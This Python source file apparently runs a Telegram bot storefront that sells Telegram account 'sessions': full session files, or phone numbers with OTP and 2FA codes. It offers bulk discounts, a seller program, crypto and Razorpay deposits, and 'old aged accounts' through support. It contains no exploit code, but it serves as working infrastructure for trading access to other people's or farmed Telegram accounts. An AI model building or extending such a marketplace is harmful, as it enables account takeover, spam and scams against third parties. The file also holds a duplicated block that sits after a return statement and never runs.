import logging
import asyncio
from datetime import datetime, timedelta
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    Application, CommandHandler, CallbackQueryHandler, 
    ContextTypes, MessageHandler, filters, ConversationHandler
)
from leaders import setup_leader_handlers
from seller import setup_seller_handlers
from telethon import TelegramClient
from telethon.sessions import StringSession
import config
from database import init_db, get_db, User, TelegramSession, Transaction, Purchase, SystemSettings
from payment_razorpay import create_order, usd_to_inr
from payment import create_charge
from keep_alive import keep_alive
from admin_seller_commands import admin_pending_sellers, admin_pending_withdrawals
from session_handler import get_available_sessions_by_country, purchase_session, get_user_purchases, get_otp_from_session
from admin import setup_admin_handlers
from payment_nowpayments import (
    create_payment as create_nowpayment,
    get_currency_display_name,
    check_payment_manually,
    RECOMMENDED_CURRENCIES
)

# Initialize logging FIRST (BEFORE get_min_deposit uses it!)
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# TON Payment imports
try:
    from payment_ton import init_ton_payment, get_ton_payment
    from payment_worker import init_payment_worker, start_payment_worker
    import qrcode
    import io
    TON_AVAILABLE = True
except ImportError:
    TON_AVAILABLE = False
    logger.warning("TON payment modules not found. TON payments will be disabled.")

# Conversation states
CUSTOM_DEPOSIT, BUY_BULK_QUANTITY, BUY_BULK_CUSTOM_QUANTITY = range(3)

def get_min_deposit():
    """Get minimum deposit from MongoDB settings"""
    try:
        settings = SystemSettings.get()
        if settings:
            min_deposit = settings.get('min_deposit', 1.0)
            logger.info(f"📊 Min deposit: ${min_deposit}")
            return min_deposit
        return 1.0
    except Exception as e:
        logger.error(f"❌ Error getting min deposit: {e}")
        return 1.0

# Initialize database
init_db()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command - FIXED FOR MONGODB"""
    user = update.effective_user
    
    # Check if user exists, create if not
    existing_user = User.get_by_telegram_id(user.id)
    if not existing_user:
        User.create(telegram_id=user.id, username=user.username or user.first_name)
    
    keyboard = [
        [
            InlineKeyboardButton("💰 Balance", callback_data='balance'),
            InlineKeyboardButton("💳 Deposit", callback_data='deposit')
        ],
        [
            InlineKeyboardButton("🛒 Buy Numbers", callback_data='buy_numbers'),
            InlineKeyboardButton("👤 Profile", callback_data='profile')
        ],
        [
            InlineKeyboardButton("🎯 Become a Seller", callback_data='become_seller')
        ],
        [
            InlineKeyboardButton("💬 Support", callback_data='support')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await update.message.reply_text(
        f"👋 Welcome {user.first_name}!\n\n"
        "🤖 Telegram Numbers Bot\n\n"
        "Choose an option below:",
        reply_markup=reply_markup
    )
async def show_menu(query):
    """Show main menu"""
    keyboard = [
        [
            InlineKeyboardButton("💰 Balance", callback_data='balance'),
            InlineKeyboardButton("💳 Deposit", callback_data='deposit')
        ],
        [
            InlineKeyboardButton("🛒 Buy Numbers", callback_data='buy_numbers'),
            InlineKeyboardButton("👤 Profile", callback_data='profile')
        ],
        [
            InlineKeyboardButton("📦 My Purchases", callback_data='my_purchases'),
            InlineKeyboardButton("💬 Support", callback_data='support')
        ]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "📋 Main Menu\n\n"
        "Select an option:",
        reply_markup=reply_markup
    )

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks - UPDATED VERSION"""
    query = update.callback_query
    await query.answer()
    
    user_id = query.from_user.id
    
    # Don't process admin/leader callbacks
    if query.data.startswith('admin_') or query.data.startswith('leader_'):
        return
    
    # Section headers (do nothing)
    if query.data == 'none':
        return
    
    if query.data.startswith('page_'):
        await handle_pagination(update, context)
        return
    # ✅ ADD PURCHASE PAGINATION HANDLER
    if query.data.startswith('purchases_page_'):
        page = int(query.data.replace('purchases_page_', ''))
        await show_my_purchases(query, user_id, page)
        return
    # ============================================
    # CRITICAL FIX: These must be handled by ConversationHandlers
    # Return early so ConversationHandler can catch them
    # ============================================
    if query.data in ['custom_deposit_ton', 'custom_deposit_inr']:
        return  # Let ConversationHandler handle
    
    # ✅ ADD THIS NEW CONDITION
    if query.data.startswith('crypto_now_custom_'):
        return  # Let ConversationHandler handle
    
    if query.data.startswith('bulk_custom_'):
        return  # Let ConversationHandler handle
    
    # ============================================
    # Main menu navigation
    # ============================================
    if query.data == 'balance':
        await show_balance(query, user_id)
    elif query.data == 'deposit':
        await show_payment_method_choice(query)
    elif query.data == 'buy_numbers':
        await show_buy_options(query)
    elif query.data == 'profile':
        await show_profile(query, user_id)
    elif query.data == 'support':
        await show_support(query)
    elif query.data == 'my_purchases':
        await show_my_purchases(query, user_id)
    elif query.data == 'back_menu':
        await show_main_menu(query)
    elif query.data == 'back_buy':
        await show_buy_options(query)
    elif query.data == 'back_deposit':
        await show_payment_method_choice(query)
    elif query.data == 'back_country':
        purchase_type = context.user_data.get('purchase_type', 'session')
        await show_country_selection(query, purchase_type)
    
    # ============================================
    # Buy options
    # ============================================
    elif query.data == 'buy_sessions_menu':
        await show_buy_sessions_menu(query)
    elif query.data == 'buy_single_session':
        context.user_data['purchase_type'] = 'session'
        await show_country_selection(query, 'session')
    elif query.data == 'buy_bulk_sessions':
        await show_bulk_country_selection(query, context)
    elif query.data == 'buy_manual_otp':
        context.user_data['purchase_type'] = 'manual'
        await show_country_selection(query, 'manual')
    
    # ============================================
    # Bulk purchase routing
    # ============================================
    elif query.data.startswith('bulk_country_'):
        country = query.data.replace('bulk_country_', '')
        await show_bulk_quantity_selection(query, country, context)
    elif query.data.startswith('bulk_buy_'):
        parts = query.data.split('_')
        country = parts[2]
        quantity = int(parts[3])
        await process_bulk_purchase(query, country, quantity, context)
    
    # ============================================
    # Country and session selection
    # ============================================
    elif query.data.startswith('country_'):
        parts = query.data.split('_')
        purchase_type = parts[1]
        country = parts[2]
        await show_sessions_by_country(query, country, purchase_type)
    elif query.data.startswith('buy_session_'):
        session_id = query.data.split('_', 2)[2]
        await process_session_purchase(query, user_id, session_id, context)
    elif query.data.startswith('buy_manual_'):
        session_id = query.data.split('_', 2)[2]
        await process_manual_purchase(query, user_id, session_id, context)
    
    # ============================================
    # Payment methods
    # ============================================
    elif query.data == 'deposit_ton':
        if TON_AVAILABLE:
            await show_ton_deposit_options(query)
        else:
            await query.answer("TON payments not configured", show_alert=True)
    elif query.data == 'deposit_inr':
        await show_inr_deposit_options(query)
    elif query.data == 'deposit_crypto_manual':
        await show_crypto_manual_selection(query)
    
    # ============================================
    # ✅ NOWPAYMENTS - ADD THESE NEW CASES
    # ============================================
    
    # Crypto currency selection
    elif query.data.startswith('crypto_now_') and not query.data.startswith('crypto_now_pay_') and not query.data.startswith('crypto_now_custom_'):
        crypto_type = query.data.replace('crypto_now_', '')
        await show_crypto_manual_amount(query, crypto_type)
    
    # Amount selection
    elif query.data.startswith('crypto_now_pay_'):
        parts = query.data.split('_')
        crypto_type = '_'.join(parts[3:-1])
        amount = float(parts[-1])
        await process_crypto_manual_deposit(query, crypto_type, amount)
    
    # Check payment status
    elif query.data.startswith('check_now_'):
        transaction_id = query.data.replace('check_now_', '')
        await check_nowpayment_status(query, transaction_id)
    
    # ============================================
    # TON deposits
    # ============================================
    elif query.data.startswith('ton_deposit_'):
        amount = int(query.data.split('_')[-1])
        await process_ton_deposit(query, user_id, amount)
    elif query.data.startswith('ton_check_'):
        transaction_id = query.data.split('_', 2)[2]
        await check_ton_payment(query, transaction_id)
    
    # ============================================
    # INR deposits
    # ============================================
    elif query.data.startswith('deposit_inr_'):
        amount = int(query.data.split('_')[2])
        await process_inr_deposit(query, user_id, amount)

async def handle_pagination(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle pagination for session lists"""
    query = update.callback_query
    await query.answer()
    
    # Parse callback data: page_session_Indo_0
    parts = query.data.split('_')
    if len(parts) < 4:
        return
    
    purchase_type = parts[1]  # 'session' or 'manual'
    country = parts[2]        # 'Indo'
    page = int(parts[3])      # 0, 1, 2...
    
    await show_sessions_by_country(query, country, purchase_type, page)


async def show_balance(query, user_id):
    """Show user balance - FIXED FOR MONGODB"""
    try:
        user = User.get_by_telegram_id(user_id)
        balance = user['balance'] if user else 0.0
        
        keyboard = [[InlineKeyboardButton("« Back", callback_data='back_menu')]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"💰 Your Balance\n\n"
            f"Balance: ${balance:.2f} USD\n\n"
            f"Use the deposit button to add funds.",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Balance error: {e}")
        await query.edit_message_text("❌ Error loading balance")

async def show_payment_method_choice(query):
    """Show payment method selection"""
    keyboard = [
        [InlineKeyboardButton("💎 TON (Crypto)", callback_data='deposit_ton')],
        [InlineKeyboardButton("💰 Crypto (BTC, ETH, USDT...)", callback_data='deposit_crypto_manual')],
        [InlineKeyboardButton("₹ INR (Razorpay)", callback_data='deposit_inr')],
        [InlineKeyboardButton("« Back", callback_data='back_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💳 Choose Payment Method\n\n"
        "Select how you'd like to add funds:",
        reply_markup=reply_markup
    )

async def show_crypto_deposit_options(query):
    """Show crypto deposit amount options"""
    keyboard = [
        [InlineKeyboardButton("$5 USD", callback_data='deposit_crypto_5'),
         InlineKeyboardButton("$25 USD", callback_data='deposit_crypto_25')],
        [InlineKeyboardButton("$50 USD", callback_data='deposit_crypto_50'),
         InlineKeyboardButton("$100 USD", callback_data='deposit_crypto_100')],
        [InlineKeyboardButton("💵 Custom Amount", callback_data='custom_deposit_crypto')],
        [InlineKeyboardButton("« Back", callback_data='back_deposit')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "💰 Crypto Deposit\n\n"
        "Accepted: BTC, ETH, USDT, LTC, etc.\n"
        "Minimum: $5 USD\n\n"
        "Choose an amount:",
        reply_markup=reply_markup
    )

async def show_inr_deposit_options(query):
    """Show INR deposit - Contact support message"""
    keyboard = [[InlineKeyboardButton("Back", callback_data='back_deposit')]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "INR Payment\n\n"
        "For INR deposits, please contact:\n"
        "@akash_support_bot\n\n"
        "Our support team will assist you with INR payment options.",
        reply_markup=reply_markup
    )

async def ask_custom_deposit(update_or_query, context: ContextTypes.DEFAULT_TYPE = None):
    """Start custom amount conversation - WITH NOWPAYMENTS"""
    
    # Handle both Update and CallbackQuery
    if hasattr(update_or_query, 'callback_query'):
        query = update_or_query.callback_query
    else:
        query = update_or_query
    
    await query.answer()
    
    # ============================================
    # ✅ ADD NOWPAYMENTS DETECTION
    # ============================================
    if query.data.startswith('crypto_now_custom_'):
        payment_method = 'crypto_now'
        crypto_type = query.data.replace('crypto_now_custom_', '')
        if context:
            context.user_data['crypto_now_type'] = crypto_type
            context.user_data['payment_method'] = payment_method
        
        crypto_name = get_currency_display_name(crypto_type)
        min_deposit = get_min_deposit()
        
        await query.edit_message_text(
            f"💬 Custom {crypto_name} Deposit\n\n"
            f"💵 Minimum: ${min_deposit:.2f} USD\n"
            f"✅ Automatic verification\n\n"
            f"Enter the amount in USD:\n"
            f"Example: 15\n\n"
            f"Send /cancel to go back."
        )
        
        return CUSTOM_DEPOSIT
    
    # Determine payment method from callback_data
    if query.data == 'custom_deposit_ton':
        payment_method = 'ton'
    elif query.data == 'custom_deposit_inr':
        payment_method = 'inr'
    else:
        payment_method = 'inr'
    
    # Store in context
    if context:
        context.user_data['payment_method'] = payment_method
    
    # Get minimum deposit
    min_deposit = get_min_deposit()
    
    # Show appropriate message
    if payment_method == 'inr':
        from payment_razorpay import usd_to_inr
        min_inr = usd_to_inr(min_deposit)
        
        await query.edit_message_text(
            f"💵 Enter Custom Amount\n\n"
            f"Send the amount in USD:\n"
            f"Example: 10\n\n"
            f"Minimum: ${min_deposit:.2f} (₹{min_inr:.0f})\n"
            f"Payment method: INR (Razorpay)\n\n"
            f"⚠️ Note: Minimum INR payment is ₹10\n\n"
            f"Send /cancel to go back."
        )
    
    return CUSTOM_DEPOSIT

     # ✅ ADD NOWPAYMENTS DETECTION
    if query.data.startswith('crypto_now_custom_'):
        payment_method = 'crypto_now'
        crypto_type = query.data.replace('crypto_now_custom_', '')
        
        # ✅ ENSURE LOWERCASE
        crypto_type = crypto_type.lower()
        
        if context:
            context.user_data['crypto_now_type'] = crypto_type
            context.user_data['payment_method'] = payment_method
        
        crypto_name = get_currency_display_name(crypto_type)
        min_deposit = get_min_deposit()
        
        await query.edit_message_text(
            f"💬 Custom {crypto_name} Deposit\n\n"
            f"💵 Minimum: ${min_deposit:.2f} USD\n"
            f"✅ Automatic verification\n\n"
            f"Enter the amount in USD:\n"
            f"Example: 15\n\n"
            f"Send /cancel to go back."
        )
        
        return CUSTOM_DEPOSIT

async def receive_custom_deposit(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle custom amount input - WITH NOWPAYMENTS"""
    try:
        amount = float(update.message.text.strip())
        
        min_deposit = get_min_deposit()
        
        logger.info(f"💰 Custom deposit amount entered: ${amount}, Min: ${min_deposit}")
        
        if amount < min_deposit:
            await update.message.reply_text(
                f"❌ Minimum deposit is ${min_deposit:.2f} USD\n\n"
                f"Please enter ${min_deposit:.2f} or more."
            )
            return CUSTOM_DEPOSIT
        
        payment_method = context.user_data.get('payment_method', 'inr')
        
        # NOWPayments handling
        if payment_method == 'crypto_now':
            crypto_type = context.user_data.get('crypto_now_type')
            
            if not crypto_type:
                await update.message.reply_text("❌ Session expired. Please start again.")
                return ConversationHandler.END
            
            crypto_type = crypto_type.lower()
            
            result = create_nowpayment(update.effective_user.id, amount, crypto_type)
            
            if not result or not result.get('success'):
                await update.message.reply_text("❌ Error creating payment. Please try again.")
                return ConversationHandler.END
            
            crypto_name = get_currency_display_name(crypto_type)
            
            keyboard = []
            
            if 'payment_url' in result:
                keyboard.append([InlineKeyboardButton("💳 Open Payment Page", url=result['payment_url'])])
            
            keyboard.append([InlineKeyboardButton("🔄 Check Status", callback_data=f'check_now_{result["transaction_id"]}')])
            keyboard.append([InlineKeyboardButton("« Menu", callback_data='back_menu')])
            
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            message = (
                f"💰 **{crypto_name} Payment**\n\n"
                f"**Amount:** ${amount:.2f} USD\n"
                f"**Pay:** {result['pay_amount']} {result['pay_currency']}\n"
                f"**Address:**\n"
                f"`{result['pay_address']}`\n\n"
            )
            
            if 'payment_url' in result:
                message += "Click 'Open Payment Page' to complete payment.\n\n"
            else:
                message += "Copy the address above and send the exact amount.\n\n"
            
            message += (
                "✅ Automatic verification\n"
                "⏰ Expires in 1 hour"
            )
            
            await update.message.reply_text(
                message,
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            context.user_data.pop('crypto_now_type', None)
            context.user_data.pop('payment_method', None)
            
            return ConversationHandler.END
        
        if payment_method == 'ton':
            from payment_ton import get_ton_payment, generate_ton_payment_url
            
            ton_handler = get_ton_payment()
            if not ton_handler:
                await update.message.reply_text(
                    "❌ TON payments are not available at the moment.\n"
                    "Please choose another payment method."
                )
                return ConversationHandler.END
            
            transaction_id = Transaction.create(
                user_id=update.effective_user.id,
                amount=amount,
                payment_method='ton',
                transaction_type='deposit'
            )
            
            payment_url = generate_ton_payment_url(
                amount_usd=amount,
                transaction_id=str(transaction_id)
            )
            
            keyboard = [
                [InlineKeyboardButton("💎 Pay with TON", url=payment_url)],
                [InlineKeyboardButton("🔍 Check Payment Status", callback_data=f'check_ton_{transaction_id}')],
                [InlineKeyboardButton("« Back", callback_data='deposit')]
            ]
            reply_markup = InlineKeyboardMarkup(keyboard)
            
            await update.message.reply_text(
                f"💎 TON Deposit\n\n"
                f"💰 Amount: ${amount:.2f} USD\n"
                f"🔗 Payment URL: [Click to Pay]({payment_url})\n\n"
                f"**Steps:**\n"
                f"1. Click 'Pay with TON' button\n"
                f"2. Complete payment in TON wallet\n"
                f"3. Return here and check status\n\n"
                f"⏰ Payment verified automatically within minutes",
                reply_markup=reply_markup,
                parse_mode='Markdown'
            )
            
            context.user_data.pop('payment_method', None)
            return ConversationHandler.END
        
        # INR/Razorpay Payment
        from payment_razorpay import create_order, usd_to_inr
        
        amount_inr = usd_to_inr(amount)
        
        if amount_inr < 10:
            await update.message.reply_text(
                f"❌ Minimum Razorpay payment is ₹10\n"
                f"(approximately ${amount_inr/83:.2f} USD)\n\n"
                f"Please enter a higher amount."
            )
            return CUSTOM_DEPOSIT
        
        order = create_order(amount, update.effective_user.id)
        
        if not order:
            await update.message.reply_text(
                "❌ Error creating payment.\n"
                "Please try again or contact support."
            )
            return ConversationHandler.END
        
        keyboard = [[InlineKeyboardButton("💳 Pay Now", url=order.get('payment_url', '#'))]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"💳 **Razorpay Payment**\n\n"
            f"💵 Amount: ₹{amount_inr:.2f} (${amount:.2f} USD)\n\n"
            f"Click 'Pay Now' to complete payment.\n\n"
            f"✅ Instant credit after payment",
            reply_markup=reply_markup,
            parse_mode='Markdown'
        )
        
        context.user_data.pop('payment_method', None)
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid amount. Please enter a valid number.\n"
            "Example: 10"
        )
        return CUSTOM_DEPOSIT
    
    except Exception as e:
        logger.error(f"Error in receive_custom_deposit: {e}")
        import traceback
        traceback.print_exc()
        
        await update.message.reply_text(
            "❌ An error occurred. Please try again or contact support."
        )
        return ConversationHandler.END

async def process_crypto_deposit(query, user_id, amount):
    """Process crypto deposit request"""
    charge = create_charge(amount, user_id)
    
    if charge:
        keyboard = [
            [InlineKeyboardButton("Pay with Crypto 💰", url=charge['hosted_url'])],
            [InlineKeyboardButton("« Back", callback_data='back_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"💰 Crypto Payment\n\n"
            f"Amount: ${amount:.2f} USD\n"
            f"Payment ID: {charge['id']}\n\n"
            f"Accepted: BTC, ETH, USDT, LTC, BCH, DOGE\n\n"
            f"Click 'Pay with Crypto' to complete payment.\n"
            f"Payment expires in 1 hour.\n\n"
            f"Your balance will be credited as ${amount:.2f} USD after confirmation.",
            reply_markup=reply_markup
        )
    else:
        await query.edit_message_text(
            "❌ Error creating payment. Please try again later."
        )

async def process_crypto_deposit_inline(update, context, user_id, amount):
    """Process crypto deposit from message (custom amount)"""
    charge = create_charge(amount, user_id)
    
    if charge:
        keyboard = [
            [InlineKeyboardButton("Pay with Crypto 💰", url=charge['hosted_url'])],
            [InlineKeyboardButton("« Main Menu", callback_data='back_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"💰 Crypto Payment\n\n"
            f"Amount: ${amount:.2f} USD\n"
            f"Payment ID: {charge['id']}\n\n"
            f"Accepted: BTC, ETH, USDT, LTC, BCH, DOGE\n\n"
            f"Click 'Pay with Crypto' to complete payment.\n"
            f"Your balance will be credited as ${amount:.2f} USD.",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "❌ Error creating payment. Please try again later."
        )

async def process_inr_deposit(query, user_id, amount):
    """Process INR deposit request"""
    # ✅ Get fresh minimum deposit
    min_deposit = get_min_deposit()
    
    logger.info(f"💳 INR Deposit: ${amount}, Min: ${min_deposit}")
    
    if amount < min_deposit:
        from payment_razorpay import usd_to_inr
        await query.edit_message_text(
            f"❌ Minimum deposit is ${min_deposit:.2f} USD (₹{usd_to_inr(min_deposit):.0f})\n\n"
            "Please select a higher amount."
        )
        return
    
    order = create_order(amount, user_id)
    
    if order:
        amount_inr = order['amount_inr']
        
        payment_link = f"https://api.razorpay.com/v1/checkout/embedded?key_id={order['key_id']}&order_id={order['order_id']}"
        
        keyboard = [
            [InlineKeyboardButton("Pay ₹{:.0f}".format(amount_inr), url=payment_link)],
            [InlineKeyboardButton("« Back", callback_data='back_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"₹ INR Payment (Razorpay)\n\n"
            f"Pay: ₹{amount_inr:.0f} INR\n"
            f"You'll receive: ${amount:.2f} USD\n\n"
            f"Order ID: {order['order_id']}\n"
            f"Payment via: UPI, Cards, NetBanking\n\n"
            f"Click button below to complete payment.",
            reply_markup=reply_markup
        )
    else:
        await query.edit_message_text(
            "❌ Error creating payment. Please try again later."
        )

async def process_inr_deposit_inline(update, context, user_id, amount):
    """Process INR deposit from message (custom amount)"""
    order = create_order(amount, user_id)
    
    if order:
        amount_inr = order['amount_inr']
        
        payment_link = f"https://api.razorpay.com/v1/checkout/embedded?key_id={order['key_id']}&order_id={order['order_id']}"
        
        keyboard = [
            [InlineKeyboardButton("Pay ₹{:.0f}".format(amount_inr), url=payment_link)],
            [InlineKeyboardButton("« Main Menu", callback_data='back_menu')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await update.message.reply_text(
            f"₹ INR Payment (Razorpay)\n\n"
            f"Pay: ₹{amount_inr:.0f} INR\n"
            f"You'll receive: ${amount:.2f} USD\n\n"
            f"Order ID: {order['order_id']}\n\n"
            f"Click button below to complete payment.",
            reply_markup=reply_markup
        )
    else:
        await update.message.reply_text(
            "❌ Error creating payment. Please try again later."
        )

async def show_buy_options(query):
    """Show buy options with single/bulk choice"""
    keyboard = [
        [InlineKeyboardButton("📱 Buy Sessions", callback_data='buy_sessions_menu')],
        [InlineKeyboardButton("📲 Buy Manual OTP", callback_data='buy_manual_otp')],
        [InlineKeyboardButton("📦 My Purchases", callback_data='my_purchases')],
        [InlineKeyboardButton("« Back", callback_data='back_menu')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "🛒 Buy Numbers\n\n"
        "📱 Sessions: Get complete session file\n"
        "📲 Manual OTP: Get number + OTP + 2FA\n\n"
        "💰 All prices in USD\n\n"
        "For old aged accounts: @Akash_support_bot\n\n"
        "Choose an option:",
        reply_markup=reply_markup,
        parse_mode='HTML'
    )

# Add this NEW function after show_buy_options:

async def show_buy_sessions_menu(query):
    """Show single vs bulk purchase menu"""
    keyboard = [
        [InlineKeyboardButton("🎯 Buy Single Session", callback_data='buy_single_session')],
        [InlineKeyboardButton("📦 Buy Bulk Sessions", callback_data='buy_bulk_sessions')],
        [InlineKeyboardButton("« Back", callback_data='back_buy')]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    
    await query.edit_message_text(
        "📱 Buy Sessions\n\n"
        "🎯 Single Session: Buy one session at a time\n"
        "📦 Bulk Sessions: Buy multiple sessions (get discount!)\n\n"
        "💡 Tip: Bulk purchases save time and money!\n\n"
        "Choose your purchase type:",
        reply_markup=reply_markup
    )

async def show_bulk_country_selection(query, context):
    """Show country selection for bulk purchase"""
    try:
        countries = TelegramSession.get_available_countries()
        
        if not countries:
            keyboard = [[InlineKeyboardButton("« Back", callback_data='buy_sessions_menu')]]
            reply_markup = InlineKeyboardMarkup(keyboard)
            await query.edit_message_text(
                "❌ No sessions available at the moment.\n\n"
                "Please check back later.",
                reply_markup=reply_markup
            )
            return
        
        keyboard = []
        for country_data in countries:
            country = country_data['_id']
            count = country_data['count']
            price = country_data['min_price']
            
            # Show bulk discount (10% off for 5+ sessions)
            bulk_price = price * 0.9  # 10% discount
            
            btn_text = f"🌍 {country} - ${price:.2f} each\n   (Bulk: ${bulk_price:.2f}/each for 5+)"
            keyboard.append([InlineKeyboardButton(
                f"🌍 {country} ({count} available)", 
                callback_data=f'bulk_country_{country}'
            )])
        
        keyboard.append([InlineKeyboardButton("« Back", callback_data='buy_sessions_menu')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            "📦 Bulk Purchase - Select Country\n\n"
            "💰 Get 5% discount on 5+ sessions!\n"
            "💰 Get 10% discount on 10+ sessions!\n\n"
            "Choose a country:",
            reply_markup=reply_markup
        )
    except Exception as e:
        logger.error(f"Bulk country selection error: {e}")
        await query.edit_message_text("❌ Error loading countries")

async def show_bulk_quantity_selection(query, country, context):
    """Show quantity selection for bulk purchase - WITH CUSTOM OPTION"""
    try:
        # Get available sessions count
        sessions = TelegramSession.get_available_by_country(country, limit=100)
        available_count = len(sessions)
        
        if available_count == 0:
            await query.edit_message_text(f"❌ No {country} sessions available")
            return
        
        # Get price
        min_price = sessions[0]['price'] if sessions else 1.0
        
        # Discount structure
        price_5 = min_price * 0.95   # 5% off
        price_10 = min_price * 0.90  # 10% off
        
        keyboard = []
        
        # ✅ ONLY 3, 5, 10 PRESETS
        quantities = [3, 5, 10]
        for qty in quantities:
            if qty <= available_count:
                if qty >= 10:
                    unit_price = price_10
                    discount = "10% off"
                elif qty >= 5:
                    unit_price = price_5
                    discount = "5% off"
                else:
                    unit_price = min_price
                    discount = "Regular"
                
                total = unit_price * qty
                btn_text = f"{qty} Sessions - ${total:.2f} ({discount})"
                keyboard.append([InlineKeyboardButton(
                    btn_text,
                    callback_data=f'bulk_buy_{country}_{qty}'
                )])
        
        # Custom quantity button
        keyboard.append([InlineKeyboardButton("💬 Custom Quantity", callback_data=f'bulk_custom_{country}')])
        keyboard.append([InlineKeyboardButton("« Back", callback_data='buy_bulk_sessions')])
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        await query.edit_message_text(
            f"📦 Bulk Purchase - {country}\n\n"
            f"📊 Available: {available_count} sessions\n"
            f"💵 Regular Price: ${min_price:.2f}/each\n"
            f"💰 5+ Sessions: ${price_5:.2f}/each (5% off)\n"
            f"💰 10+ Sessions: ${price_10:.2f}/each (10% off)\n\n"
            f"Select quantity or choose custom:",
            reply_markup=reply_markup
        )
        
    except Exception as e:
        logger.error(f"Bulk quantity selection error: {e}")
        await query.edit_message_text("❌ Error")            

async def bulk_custom_quantity_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start custom quantity input - FIXED"""
    query = update.callback_query
    await query.answer()
    
    # Extract country from callback_data
    country = query.data.replace('bulk_custom_', '')
    
    # Store in context
    context.user_data['bulk_country'] = country
    
    # Get available sessions
    sessions = TelegramSession.get_available_by_country(country, limit=100)
    available_count = len(sessions)
    
    if available_count == 0:
        await query.edit_message_text(f"❌ No {country} sessions available")
        return ConversationHandler.END
    
    # Store base price
    if sessions:
        base_price = sessions[0]['price']
        context.user_data['bulk_base_price'] = base_price
    else:
        await query.edit_message_text(f"❌ Error loading sessions")
        return ConversationHandler.END
    
    await query.edit_message_text(
        f"💬 Custom Bulk Purchase - {country}\n\n"
        f"📊 Available: {available_count} sessions\n"
        f"💵 Base Price: ${base_price:.2f}/session\n\n"
        f"💰 Discounts:\n"
        f"  • 5-9 sessions: 5% off\n"
        f"  • 10+ sessions: 10% off\n\n"
        f"Enter the number of sessions you want to buy:\n"
        f"(Minimum: 3, Maximum: {available_count})\n\n"
        f"Send /cancel to go back."
    )
    
    return BUY_BULK_CUSTOM_QUANTITY

async def receive_bulk_custom_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Receive custom bulk quantity input"""
    try:
        quantity = int(update.message.text.strip())
        
        country = context.user_data.get('bulk_country')
        
        if not country:
            await update.message.reply_text("❌ Session expired. Please start again.")
            return ConversationHandler.END
        
        # Get available sessions
        sessions = TelegramSession.get_available_by_country(country, limit=100)
        available_count = len(sessions)
        
        # ✅ FIX: Get base price from context OR from fresh session data
        base_price = context.user_data.get('bulk_base_price')
        if not base_price and sessions:
            base_price = sessions[0]['price']
        elif not base_price:
            await update.message.reply_text("❌ Error: Could not determine pricing. Please start again.")
            return ConversationHandler.END
        
        # Validate quantity
        if quantity < 3:
            await update.message.reply_text(
                f"❌ Minimum quantity is 3 sessions.\n\n"
                f"Please enter a number between 3 and {available_count}."
            )
            return BUY_BULK_CUSTOM_QUANTITY
        
        if quantity > available_count:
            await update.message.reply_text(
                f"❌ Only {available_count} sessions available!\n\n"
                f"Please enter a number between 3 and {available_count}."
            )
            return BUY_BULK_CUSTOM_QUANTITY
        
        # Calculate pricing
        if quantity >= 10:
            unit_price = base_price * 0.90
            discount = "10% off"
            discount_percent = 10
        elif quantity >= 5:
            unit_price = base_price * 0.95
            discount = "5% off"
            discount_percent = 5
        else:
            unit_price = base_price
            discount = "Regular price"
            discount_percent = 0
        
        total_cost = unit_price * quantity
        savings = (base_price * quantity) - total_cost
        
        # Show confirmation
        keyboard = [
            [InlineKeyboardButton("✅ Confirm Purchase", callback_data=f'bulk_buy_{country}_{quantity}')],
            [InlineKeyboardButton("❌ Cancel", callback_data='buy_bulk_sessions')]
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        
        discount_text = f"\n🎉 Discount: {discount_percent}% off\n💵 You save: ${savings:.2f}" if discount_percent > 0 else ""
        
        await update.message.reply_text(
            f"📋 Bulk Purchase Summary\n\n"
            f"🌍 Country: {country}\n"
            f"📦 Quantity: {quantity} sessions\n"
            f"💵 Price/session: ${unit_price:.2f} ({discount})\n"
            f"💰 Total Cost: ${total_cost:.2f}"
            f"{discount_text}\n\n"
            f"Confirm your purchase?",
            reply_markup=reply_markup
        )
        
        # Clear context data
        context.user_data.pop('bulk_country', None)
        context.user_data.pop('bulk_base_price', None)
        
        return ConversationHandler.END
        
    except ValueError:
        await update.message.reply_text(
            "❌ Invalid input. Please enter a number.\n\n"
            "Example: 15"
        )
        return BUY_BULK_CUSTOM_QUANTITY
    except Exception as e:
        logger.error(f"Error in receive_bulk_custom_quantity: {e}")
        await update.message.reply_text("❌ Error occurred. Please try again.")
        return ConversationHandler.END

async def cancel_bulk_custom_quantity(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Cancel custom bulk quantity input - FIXED"""
    # Clear bulk-related context data
